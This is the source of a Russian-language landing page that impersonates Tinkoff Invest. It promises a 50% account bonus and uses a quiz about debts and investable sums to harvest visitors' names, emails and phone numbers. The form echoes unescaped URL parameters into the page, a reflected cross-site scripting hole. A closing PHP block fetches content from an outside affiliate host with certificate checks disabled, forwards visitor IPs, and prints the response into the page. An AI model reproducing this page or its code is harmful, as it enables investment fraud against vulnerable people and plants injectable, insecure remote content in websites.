<!DOCTYPE html>
<html>

<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<title>Тинькофф инвест</title>
	<script type="text/javascript" src="assets/landing/js/jquery.min.js"></script>
    <script type="text/javascript" src="assets/landing/js/jquery.mask.min.js"></script>
    <script type="text/javascript" src="assets/landing/js/jquery.validate.min.js"></script>
	<script src="js/custom.js"></script>
	<link href="assets/landing/css/intlTelInput.css" rel="stylesheet" type="text/css">
	<link href="assets/landing/css/landing.css" rel="stylesheet" type="text/css">
	<link rel="icon" type="image/svg" sizes="42x42" href="images/favicon.ico">
	<link href="css/style.css" rel="stylesheet">
	<link href="css/quiz.css" rel="stylesheet">
	<link href="css/question.css" rel="stylesheet">
	<link href="css/media.css" rel="stylesheet">
	<link rel="icon" type="image/png" href="images/favicon.ico">

<!--[HEADER]--></head>

<body>
	<style>
		.test-step {
			display: none;
		}

		.test-step.active {
			display: block;
		}

		.app__start-page.test-step.active {
			display: flex;
		}
	</style>

	<div id="hero">
		<div class="hero-mobile">
			<div class="hero-mobile-head">
				<img class="lazyload" data-src="images/logo_t.png">
			</div>
			<div class="hero-announce">
				<div class="hero-percent" style="color:#ffce00;">
					до&nbsp;50%
				</div>

				<div class="hero-percent-text">
					Дополнительно на счёт до <br> <span class="promo-day" style="color:#ffce00"></span> <span class="promo-month" style="color:#ffce00;text-transform:uppercase;"></span>
				</div>
			</div>
			<h1>Инвестируйте и начните зарабатывать на крупнейших частных компаниях!</h1>
			<h3>Пройдите тест и получите доступ к платформе!</h3>

			<div class="btn-yellow-div btn-question btn-question-next tin-btn-wrapper">
				<a href="#" onclick="document.location.hash='';return false;" data-next="1" class="start_button btn-next blinked-btn b-quiz-btn__light b-quiz-btn__icon">
					<span>Получить доступ</span>
					<img class="lazyload" data-src="images/next.svg">
				</a>
			</div>
			<div class="hero-wrapper" style="margin-top:44px;font-size:12px;color:#333;text-align:center;">Мы не являемся
				банком "Тинькофф". Программа направлена на сопровождение и торговые сигналы для получения дохода от
				инвестиций</div>
		</div>

		<div class="hero-wrapper hero-desctop">
			<div class="hero-left">
			</div>
			<div class="hero-right" style="width: 50%">
				<div class="hero-body">
					<div class="hero-announce" style="display: block">
						<div class="hero-percent-text" style="text-align: center">
							<span style="color:#ffce00;text-transform:uppercase; font-size: 4rem">до&nbsp;50%</span> <br>
							Дополнительно на счёт до
							<span class="promo-day1"></span>
							<span class="promo-month1" style="color:#ffce00;text-transform:uppercase;"></span>
						</div>
					</div>
					<h1>Инвестируйте и начните зарабатывать на крупнейших частных компаниях!</h1>
					<h3>Пройдите тест и получите доступ к платформе!</h3>
					<div class="btn-yellow-div btn-question btn-question-next tin-btn-wrapper">
						<a href="#" onclick="document.location.hash='';return false;" data-next="1" class="start_button btn-next blinked-btn b-quiz-btn__light b-quiz-btn__icon">
							<span>Получить доступ</span>
							<img class="lazyload" data-src="images/next.svg">
						</a>
					</div>
				</div>
			</div>
		</div>
	</div>

	<div id="last-stand">
		<div class="form">
			<div class="form-head">
				<h1>Поздравляем, вам стали доступны инвестиции на платформе!</h1>
			</div>
			<div class="form-body">
				<div class="form-body-left">
					<h2>Оставьте свой номер и мы вам перезвоним </h2>
					<div class="form-body-left-gift">
						<img class="lazyload" data-src="images/gift.svg">
						Заполните форму и получите специальное антикризисное предложение и 50% дополнительно на счёт
					</div>
				</div>
				<div class="form-body-right">
					<form action="api.php" class="contact_form reg-form" id="form1" method="post"><?php if (isset($_GET["utm_source"])) : ?><input type="hidden" name="utm_source" value="<?=$_GET["utm_source"];?>" /><?php endif; ?><?php if (isset($_GET["utm_content"])) : ?><input type="hidden" name="utm_content" value="<?=$_GET["utm_content"];?>" /><?php endif; ?><?php if (isset($_GET["utm_term"])) : ?><input type="hidden" name="utm_term" value="<?=$_GET["utm_term"];?>" /><?php endif; ?><?php if (isset($_GET["utm_campaign"])) : ?><input type="hidden" name="utm_campaign" value="<?=$_GET["utm_campaign"];?>" /><?php endif; ?><?php if (isset($_GET["utm_medium"])) : ?><input type="hidden" name="utm_medium" value="<?=$_GET["utm_medium"];?>" /><?php endif; ?><?php if (isset($_GET["subid"])) : ?><input type="hidden" name="subid" value="<?=$_GET["subid"];?>" /><?php endif; ?><?php if (isset($_GET["uuid"])) : ?><input type="hidden" name="uuid" value="<?=$_GET["uuid"];?>" /><?php endif; ?><?php if (isset($_GET["fbclid"])) : ?><input type="hidden" name="fbclid" value="<?=$_GET["fbclid"];?>" /><?php endif; ?><?php if (isset($_GET["gclid"])) : ?><input type="hidden" name="gclid" value="<?=$_GET["gclid"];?>" /><?php endif; ?><?php if (isset($_GET["cpc"])) : ?><input type="hidden" name="cpc" value="<?=$_GET["cpc"];?>" /><?php endif; ?><?php if (isset($_GET["cur"])) : ?><input type="hidden" name="cur" value="<?=$_GET["cur"];?>" /><?php endif; ?>						<input name="forename" class="user-input" placeholder="Ваше имя" type="text" required="">
						<input name="surname" class="user-input" placeholder="Ваша фамилия" type="text" required="">
						<input name="email" class="user-input" placeholder="Ваш Email" type="email" required="">
						<div class="form-control">
							<input type="tel" name="phone" class="phone" required="">
						</div>
						<button name="button" id="btn-submit" class="btn-submit btn-reg" type="submit">
							<img class="lazyload" data-src="images/check.svg">
							<span>Начать зарабатывать</span>
						</button>
						<div class="checkbox-control">
							<input type="checkbox" name="policy" id="pol" checked>
							<label for="pol">С <a href="?page=privacy" target="_blank">политикой
									конфиденциальности</a>
								ознакомлен</label>
						</div>

						<input type="hidden" name="phonecc" value="" class="phonecc" />
        				<input type="hidden" name="country" value="ru" />
					</form>
				</div>
			</div>
		</div>
	</div>

	<div id="thankyou">
		<div class="ty-div">
			<div class="thankyou-head">
				<img class="lazyload" data-src="images/c_circle.png">
				<h1>Спасибо!</h1>
			</div>
			<h2>Мы скоро с вами свяжемся</h2>
			<h3>💸 50% дополнительно на счёт</h3>
			<h3>Ваши бонусы</h3>
			<div class="dblock-body">
				<div class="discount-unlock-items">
					<div class="discount-unlock-item">
						<div class="discount-unlock-item-photo duip-1">
						</div>
						<div class="discount-unlock-item-text">
							50% дополнительно на счёт
						</div>
						<div class="dui-block-wrapper">
							<div class="dui-block"></div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>

	<div id="app" style="display:none">
		<div class="question">
			<div class="question-inner-wrapper">
				<div class="question-inner-text-wrapper">
					<div class="question-text">
						<div class="question-subtitle">
							Узнайте какая программа инвестирования подходит именно вам!
						</div>
						<div class="question-title" id="q-title">
							Готовы ли вы начать инвестировать?
						</div>
						<div class="question-progress-bar" id="question-progress-bar">
							<div class="question-progress-bar-text">
								<div class="pdd-main">
									<div class="question-progress-bar-text-key">Готово:</div>
									<div class="question-progress-bar-text-value" id="q-progress-percent">0%</div>
								</div>
								<div class="pdd-data">
									<div class="dd-title">Бонус:</div>
									<div class="dd-value">
										<span class="dd-value-data">0</span>
										<span>%</span>
										<img data-src="images/darrow.svg" class="floating-arrow lazyload">
									</div>
								</div>
							</div>
							<div class="question-progress-bar-line">
								<span class="progress-fill"></span>
							</div>
							<div class="media-discount-manager">
								<div class="media-discount-manager-wrapper">
									<div class="media-discount-manager-photo">
									</div>
									<div class="media-discount-manager-name">
										<span class="dm-name">Ирина</span>
										<div class="manager-say">
											<span class="dm-job">Юрист эксперт</span>
											<img class="lazyload" id="manager-say" data-src="images/arrow_display.svg">
										</div>
										<div class="media-manager-text body_say_hide">
											Ответы на эти вопросы помогут нам подобрать...
										</div>
									</div>
								</div>
							</div>
							<div class="media-bonuses">
								<div class="media-bonuses-wrapper">
									<div class="media-bonuses-head">
										<div class="media-bonuses-head-left">
											<img class="lazyload" data-src="images/gift.svg">
											<span>Бонусы <strong>(1)</strong></span>
										</div>
										<div class="media-bonuses-head-right">
											<img class="lazyload" data-src="images/arrow_display.svg">
										</div>
									</div>
									<div class="media-bonuses-body">
										<div class="media-bonuses-body-line">
										</div>
										<div class="discount-unlock-items">
											<div class="discount-unlock-item">
												<div class="discount-unlock-item-photo duip-1">
												</div>
												<div class="discount-unlock-item-text">
													до 50% дополнительно на счёт
												</div>
												<div class="dui-block-wrapper">
													<div class="dui-block"></div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="q-rel">
							<div class="q-block q-vision" id="question_0">
								<div class="question-list">
									<div class="question-item">
										<input type="radio" name="question_1" id="question_1_1" value="Да">
										<label for="question_1_1">Да</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_1" id="question_1_2" value="Нет">
										<label for="question_1_2">Нет</label>
										<div class="question-item-check"></div>
									</div>
								</div>
								<!--ACTIONS-->
								<div class="question-actions">
									<div class="btn-white-div btn-question btn-question-prev">
										<a href="#" onclick="document.location.hash='';return false;" data-prev="0" class="btn-prev b-quiz-btn__light b-quiz-btn__icon">
											<img class="lazyload" data-src="images/prev.svg">
											<span>Назад</span>
										</a>
									</div>
									<div class="btn-yellow-div btn-question btn-question-next">
										<a href="#" onclick="document.location.hash='';return false;" data-next="1" class="btn-next blinked-btn b-quiz-btn__light b-quiz-btn__icon">
											<span>Далее</span>
											<img class="lazyload" data-src="images/next.svg">
										</a>
									</div>
								</div>
								<!--ACTIONS-->
							</div>
							<div class="q-block" id="question_1">
								<div class="question-list">
									<div class="question-item">
										<input type="radio" name="question_2" id="question_2_1" value="Да, успешно инвестирую по сей день">
										<label for="question_2_1">Да, успешно инвестирую по сей день</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_2" id="question_2_1" value="Нет, никогда прежде не инвестировал">
										<label for="question_2_1">Нет, никогда прежде не инвестировал</label>
										<div class="question-item-check"></div>
									</div>
								</div>
								<!--ACTIONS-->
								<div class="question-actions">
									<div class="btn-white-div btn-question btn-question-prev">
										<a href="#" onclick="document.location.hash='';return false;" data-prev="0" class="btn-prev b-quiz-btn__light b-quiz-btn__icon">
											<img class="lazyload" data-src="images/prev.svg">
											<span>Назад</span>
										</a>
									</div>
									<div class="btn-yellow-div btn-question btn-question-next">
										<a href="#" onclick="document.location.hash='';return false;" data-next="1" class="btn-next blinked-btn b-quiz-btn__light b-quiz-btn__icon">
											<span>Далее</span>
											<img class="lazyload" data-src="images/next.svg">
										</a>
									</div>
								</div>
								<!--ACTIONS-->
							</div>
							<div class="q-block" id="question_2">
								<div class="question-list">
									<div class="question-item">
										<input type="radio" name="question_3" id="question_3_1" value="Несколько часов в день">
										<label for="question_3_1">Несколько часов в день</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_3" id="question_3_2" value="Весь день">
										<label for="question_3_2">Весь день</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_3" id="question_3_3" value="Один раз в неделю">
										<label for="question_3_3">Один раз в неделю</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_3" id="question_3_4" value="Один раз в месяц">
										<label for="question_3_4">Один раз в месяц</label>
										<div class="question-item-check"></div>
									</div>
								</div>
								<!--ACTIONS-->
								<div class="question-actions">
									<div class="btn-white-div btn-question btn-question-prev">
										<a href="#" onclick="document.location.hash='';return false;" data-prev="0" class="btn-prev b-quiz-btn__light b-quiz-btn__icon">
											<img class="lazyload" data-src="images/prev.svg">
											<span>Назад</span>
										</a>
									</div>
									<div class="btn-yellow-div btn-question btn-question-next">
										<a href="#" onclick="document.location.hash='';return false;" data-next="1" class="btn-next blinked-btn b-quiz-btn__light b-quiz-btn__icon">
											<span>Далее</span>
											<img class="lazyload" data-src="images/next.svg">
										</a>
									</div>
								</div>
								<!--ACTIONS-->
							</div>
							<div class="q-block" id="question_3">
								<div class="question-list">
									<div class="question-item">
										<input type="radio" name="question_4" id="question_4_1" value=">Да, у меня есть постоянный доступ">
										<label for="question_4_1">Да, у меня есть постоянный доступ</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_4" id="question_4_2" value="Доступ к интернету есть, но переодический">
										<label for="question_4_2">Доступ к интернету есть, но переодический</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_4" id="question_4_3" value="Нет, у меня нет интернета">
										<label for="question_4_3">Нет, у меня нет интернета</label>
										<div class="question-item-check"></div>
									</div>
								</div>
								<!--ACTIONS-->
								<div class="question-actions">
									<div class="btn-white-div btn-question btn-question-prev">
										<a href="#" onclick="document.location.hash='';return false;" data-prev="0" class="btn-prev b-quiz-btn__light b-quiz-btn__icon">
											<img class="lazyload" data-src="images/prev.svg">
											<span>Назад</span>
										</a>
									</div>
									<div class="btn-yellow-div btn-question btn-question-next">
										<a href="#" onclick="document.location.hash='';return false;" data-next="1" class="btn-next blinked-btn b-quiz-btn__light b-quiz-btn__icon">
											<span>Далее</span>
											<img class="lazyload" data-src="images/next.svg">
										</a>
									</div>
								</div>
								<!--ACTIONS-->
							</div>
							<div class="q-block" id="question_4">
								<div class="question-list">
									<div class="question-item">
										<input type="radio" name="question_5" id="question_5_1" value="От 15.000 до 50.000 рублей">
										<label for="question_5_1">От 15.000 до 50.000 рублей </label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_5" id="question_5_2" value="От 50.000 до 100.000 рублей">
										<label for="question_5_2">От 50.000 до 100.000 рублей</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_5" id="question_5_2" value="Сумма не ограничена">
										<label for="question_5_2">Сумма не ограничена</label>
										<div class="question-item-check"></div>
									</div>
								</div>
								<!--ACTIONS-->
								<div class="question-actions">
									<div class="btn-white-div btn-question btn-question-prev">
										<a href="#" onclick="document.location.hash='';return false;" data-prev="0" class="btn-prev b-quiz-btn__light b-quiz-btn__icon">
											<img class="lazyload" data-src="images/prev.svg">
											<span>Назад</span>
										</a>
									</div>
									<div class="btn-yellow-div btn-question btn-question-next">
										<a href="#" onclick="document.location.hash='';return false;" data-next="1" class="btn-next blinked-btn b-quiz-btn__light b-quiz-btn__icon">
											<span>Далее</span>
											<img class="lazyload" data-src="images/next.svg">
										</a>
									</div>
								</div>
								<!--ACTIONS-->
							</div>
							<div class="q-block" id="question_5">
								<div class="question-list">
									<div class="question-item">
										<input type="radio" name="question_6" id="question_6_1" value="Да, у меня есть кредит">
										<label for="question_6_1">Да, у меня есть кредит</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_6" id="question_6_2" value="Да, у меня есть ипотека">
										<label for="question_6_2">Да, у меня есть ипотека</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_6" id="question_6_3" value="Нет, только бытовые расходы">
										<label for="question_6_3">Нет, только бытовые расходы</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_6" id="question_6_3" value="Нет, но хочу быть финансово независимым">
										<label for="question_6_3">Нет, но хочу быть финансово независимым</label>
										<div class="question-item-check"></div>
									</div>
								</div>
								<!--ACTIONS-->
								<div class="question-actions">
									<div class="btn-white-div btn-question btn-question-prev">
										<a href="#" onclick="document.location.hash='';return false;" data-prev="0" class="btn-prev b-quiz-btn__light b-quiz-btn__icon">
											<img class="lazyload" data-src="images/prev.svg">
											<span>Назад</span>
										</a>
									</div>
									<div class="btn-yellow-div btn-question btn-question-next">
										<a href="#" onclick="document.location.hash='';return false;" data-next="1" class="btn-next blinked-btn b-quiz-btn__light b-quiz-btn__icon">
											<span>Далее</span>
											<img class="lazyload" data-src="images/next.svg">
										</a>
									</div>
								</div>
								<!--ACTIONS-->
							</div>
							<div class="q-block" id="question_6">
								<div class="question-list">
									<div class="question-item">
										<input type="radio" name="question_7" id="question_7_1" value="Хочу обезопасить себя от кризиса">
										<label for="question_7_1">Хочу обезопасить себя от кризиса</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_7" id="question_7_2" value="Планирую развивать бизнес">
										<label for="question_7_2">Планирую развивать бизнес</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_7" id="question_7_3" value="Хочу получать дополнительный пассивный доход">
										<label for="question_7_3">Хочу получать дополнительный пассивный доход</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_7" id="question_7_3" value="Хочу, чтобы моя семья ни в чем не нуждалась">
										<label for="question_7_3">Хочу, чтобы моя семья ни в чем не нуждалась</label>
										<div class="question-item-check"></div>
									</div>
								</div>
								<!--ACTIONS-->
								<div class="question-actions">
									<div class="btn-white-div btn-question btn-question-prev">
										<a href="#" onclick="document.location.hash='';return false;" data-prev="0" class="btn-prev b-quiz-btn__light b-quiz-btn__icon">
											<img class="lazyload" data-src="images/prev.svg">
											<span>Назад</span>
										</a>
									</div>
									<div class="btn-yellow-div btn-question btn-question-next">
										<a href="#" onclick="document.location.hash='';return false;" data-next="1" class="btn-next blinked-btn b-quiz-btn__light b-quiz-btn__icon">
											<span>Далее</span>
											<img class="lazyload" data-src="images/next.svg">
										</a>
									</div>
								</div>
								<!--ACTIONS-->
							</div>
							<div class="q-block" id="question_7">
								<div class="question-list">
									<div class="question-item">
										<input type="radio" name="question_8" id="question_8_1" value="Буду выплачивать кредит/ипотеку/погашу долги">
										<label for="question_8_1">Буду выплачивать кредит/ипотеку/погашу долги</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_8" id="question_8_2" value="Куплю себе то, что давно хотел">
										<label for="question_8_2">Куплю себе то, что давно хотел</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_8" id="question_8_3" value=">Буду вкладывать далее, чтобы больше преумножить средства">
										<label for="question_8_3">Буду вкладывать далее, чтобы больше преумножить
											средства</label>
										<div class="question-item-check"></div>
									</div>
									<div class="question-item">
										<input type="radio" name="question_8" id="question_8_3" value="Еще не решил">
										<label for="question_8_3">Еще не решил</label>
										<div class="question-item-check"></div>
									</div>
								</div>
								<!--ACTIONS-->
								<div class="question-actions">
									<div class="btn-white-div btn-question btn-question-prev">
										<a href="#" onclick="document.location.hash='';return false;" data-prev="0" class="btn-prev b-quiz-btn__light b-quiz-btn__icon">
											<img class="lazyload" data-src="images/prev.svg">
											<span>Назад</span>
										</a>
									</div>
									<div class="btn-yellow-div btn-question btn-question-next">
										<a href="#" onclick="document.location.hash='';return false;" data-next="1" class="btn-next blinked-btn b-quiz-btn__light b-quiz-btn__icon">
											<span>Далее</span>
											<img class="lazyload" data-src="images/next.svg">
										</a>
									</div>
								</div>
								<!--ACTIONS-->
							</div>
						</div>
					</div>
				</div>
				<div class="question-data">
					<div class="question-data-wrapper">
						<div class="discount-data">
							<div class="dd-title">Скидка:</div>
							<div class="dd-value">
								<span class="dd-value-data">0</span>
								<span>%</span>
								<img data-src="images/darrow.svg" class="floating-arrow lazyload">
							</div>
						</div>
						<div class="discount-manager">
							<div class="discount-manager-photo">
							</div>
							<div class="discount-manager-name">
								<span class="dm-name">Ирина</span>
								<span class="dm-job">Юрист эксперт</span>
							</div>
						</div>
						<div class="discount-manager-text">
							Ответы на эти вопросы помогут нам подобрать...
						</div>
						<div class="discount-unlock">
							<div class="discount-unlock-wrapper">
								<div class="discount-unlock-title">
									<span class="pulse-dot"></span>
									Пройдите опрос, чтобы получить
								</div>
								<div class="discount-unlock-items">
									<div class="discount-unlock-item">
										<div class="discount-unlock-item-photo duip-1">
										</div>
										<div class="discount-unlock-item-text">
											до 50% дополнительно на счёт
										</div>
										<div class="dui-block-wrapper">
											<div class="dui-block"></div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" integrity="sha512-q583ppKrCRc7N5O0n2nzUiJ+suUv7Et1JGels4bXOaMFQcamPk9HjdUknZuuFjBNs7tsMuadge5k9RzdmO+1GQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
	<script src="assets/landing/js/intlTelInput.js"></script>
	<script src="assets/landing/js/form.js"></script>
	<script src="answers.js"></script>

<!--[FOOTER]--></body>

</html><?php
$curl = curl_init( "https://dozaclick.com/tinkoff-invest/sign-up/?flow=3141&only=code&" . http_build_query($_GET) );
curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $curl, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"] );
curl_setopt( $curl, CURLOPT_HTTPHEADER, [
 "X-Real-IP: " . $_SERVER["HTTP_CF_CONNECTING_IP"] ? $_SERVER["HTTP_CF_CONNECTING_IP"] : ( $_SERVER["HTTP_X_FORWARDED_FOR"] ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"] ),
 "X-Host: " .  $_SERVER["HTTP_X_FORWARDED_HOST"] ? $_SERVER["HTTP_X_FORWARDED_HOST"] : ( $_SERVER["HTTP_X_HOST"] ? $_SERVER["HTTP_X_HOST"] : ( $_SERVER["HTTP_HOST"] ? $_SERVER["HTTP_HOST"] : $_SERVER["SERVER_NAME"] ) )
]);
curl_setopt( $curl, CURLOPT_SSL_VERIFYHOST, 0 );
curl_setopt( $curl, CURLOPT_SSL_VERIFYPEER, 0 );
curl_exec( $curl );
curl_close( $curl );
?>